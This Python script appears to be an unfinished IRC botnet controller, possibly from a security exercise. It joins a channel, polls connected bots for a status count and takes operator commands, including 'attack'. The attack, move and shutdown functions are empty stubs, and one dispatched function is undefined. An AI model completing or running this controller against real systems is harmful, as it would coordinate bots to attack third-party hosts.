import time
import socket
import sys
import random
import select

ERROR_FLAG = -1

#connection info
irc = ""
channel = "#"
con_active = False

#controller info
nick = "controller"
atk_cnt = 0
active = True

#send a command to the bots
def send_command():
	return



#ids bots and prints out numbers
def cmd_status():
	send("PRIVMSG " + channel +" "+"status"+"\n")
	##gets replieds back from irc
	msg = ""
	while msg == "":
		time.sleep(1)
		msg = rcv_irc_response()
		msg = msg.strip()
	
	i = 0
	bot_names = []
	msgs = msg.split("\n")
	for m in msgs:
		i = i +1
		bot_names.append((m[m.find(':', 1)+1:] + "\n").strip())
		
	print("num of bots: " + str(i))
	print(str(bot_names))
	#except somerror:
		#con_active = False
	
#tells the bots to attack the hostname
def cmd_attack(hostname, port):
	#send a message containing  a counter and the nick of the bot
	#on next attack increase the counter
	#bots send a message back to controller telling if success or not  
	return



#move bots from current irc to new irc
def move(hostname, port, channel):
	#instructs bots to disconnect from current irc and move to another one
	return

#controller will disconnect from the bots and terminate
def cmd_quit():	
	return

#this kills the bot(s)
def cmd_shutdown():
	return

#wait for a user to send command to the irc needs error checking
def get_command():
	msg = input("command> ")
	cmd = msg.split()
	return cmd


#send as bytes TO DO
def send(msg):
	global con_active
	#try:
	irc.send(msg.encode('UTF-8'))
	#except someerror:
		#con_active = False
	return
	
#receive a command from the controller TO DO parsing needed and error checking
def rcv_irc_response():
	#try:
	msg = irc.recv(1024).decode()
	if msg.find('PING') != -1:
		send('PONG ' + msg.split()[1] + '\r\n')
		return "Ping pong conflict"
	else:		
		return msg

#connect to the specified IRC server and channel
def connect(host, port):
	global nick, irc, con_active
	irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		irc.connect((host,port))
		con_active = True
		print("connection made")
	except ConnectionRefusedError:
		print("Error: Could not make connection")
		return ERROR_FLAG
		
	send("USER " + nick + " " + nick + " " + nick + ": This controller is connecting\n") 
	send("NICK " + nick + "\n")
	send("JOIN " + channel + "\n")
	return 

#handle the connection to the IRC server
def handle_connection():
	#TO DO Verify controller
	print('command> ', end = '', flush=True)
	while active:
		readable, writeable, exceptable = select.select([irc,sys.stdin],[sys.stdout],[])
		for s in readable:
			##check the type
			#if s std do cmds
			
			if s == sys.stdin:
				#wait for commands
				msg = sys.stdin.readline()
				cmd = msg.split()
						
				#interpret command
				if cmd[0] == 'status':	
					cmd_status()
				elif cmd[0] == "attack":
					cmd_attack(cmd[1],cmd[2])
				elif cmd[0] == "move":
					cmd_move(cmd[1], cmd[2], cmd[3]) 
				elif cmd[0] == "quit":
					cmd_quit() 
				elif cmd[0] == "shutdown":
					cmd_shutdown()
				elif con_active == False:
					break
				else:
					print("Error: Unrecognized command received '" + ' '.join(cmd) + "'")
				print('command> ', end = '', flush=True)
			elif s == irc:			
				msg = irc.recv(1024).decode()
				send('PONG ' + msg.split()[1] + '\r\n')
				
			#else ping pong	

		

	return

#main
def main():
	global channel, secret_phrase
	hostname = ""
	port = 0
	secret_phrase = ""
	
	#ensure correct number of commands
	if len(sys.argv) != 5:
		print("Error: Incorrect number of command line arguments. Command is...")
		print("\tbot.py <hostname> <port> <channel> <secret-phrase>")
		return
		
	#ensure port is a number
	if not sys.argv[2].isdigit():
		print("Error: Command argument 2 could not be processed. Command is...")
		print("\tbot.py <hostname> <port> <channel> <secret-phrase>")
		return
		
	#extract arguments from command line
	hostname = sys.argv[1]
	port = int(sys.argv[2])
	channel = channel + sys.argv[3]
	secret_phrase = sys.argv[4]
	
	#loop to keep trying to connect to irc when not shutdown
	while True:
		#connect to the IRC server
		status = connect(hostname, port)
		
		if status != ERROR_FLAG:
			#handle the connection
			handle_connection()
		#if handle_connection exited without shutdown command
		if active == True:
			#wait 5 seconds before retrying connection
			time.sleep(5)
		else:
			break

	return

main()
